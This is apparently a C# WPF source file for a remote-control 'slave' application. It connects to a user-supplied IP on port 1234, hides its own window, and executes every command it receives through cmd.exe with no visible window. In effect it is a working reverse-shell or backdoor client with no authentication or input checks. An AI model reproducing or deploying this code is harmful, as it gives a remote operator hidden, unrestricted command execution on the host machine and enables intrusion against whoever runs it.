using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;

namespace FusionSlaveApplicaiton
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        Socket socket;
        byte[] GlobalBuffer = new byte[1024];
        public MainWindow()
        {
            InitializeComponent();
            socket = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
        }

        private void Connect_Click(object sender, RoutedEventArgs e)
        {
            if (IPBox.Text.Length > 0)
            {
                try
                {
                    socket.Connect(new IPEndPoint(IPAddress.Parse(IPBox.Text), 1234));
                    MessageBox.Show("Connected!");
                    this.Hide();
                    Listen();
                }
                catch { }
            }
            else
            {
                MessageBox.Show("Enter IP address");
            }
        }

        private void Listen()
        {
            byte[] buffer = new byte[1024];
            try
            {
                socket.BeginReceive(GlobalBuffer, 0, GlobalBuffer.Length, 0, new AsyncCallback(ReciveCallback), socket);
            }
            catch { }
        }

        private void ReciveCallback(IAsyncResult ar)
        {
            int recived=0;
            try
            {
                Socket LocalSocket = (Socket)ar.AsyncState;
                recived = LocalSocket.EndReceive(ar);
            }
            catch
            {
                Environment.Exit(0);
            }
            byte[] LocalBuffer = new byte[recived];
            Array.Copy(GlobalBuffer, LocalBuffer, recived);
            string Command = Encoding.ASCII.GetString(LocalBuffer);
            ExecuteCommand(Command);
            try
            {
                socket.BeginReceive(GlobalBuffer, 0, GlobalBuffer.Length, 0, new AsyncCallback(ReciveCallback), socket);
            }
            catch { }
        }
                
        public void ExecuteCommand(string Command)
        {
            ProcessStartInfo ProcessInfo;
            Process Process;
            ProcessInfo = new ProcessStartInfo("cmd.exe", "/K " + Command+" && exit");
            ProcessInfo.CreateNoWindow = true;
            ProcessInfo.UseShellExecute = true;
            Process = Process.Start(ProcessInfo);
        }
    }
}
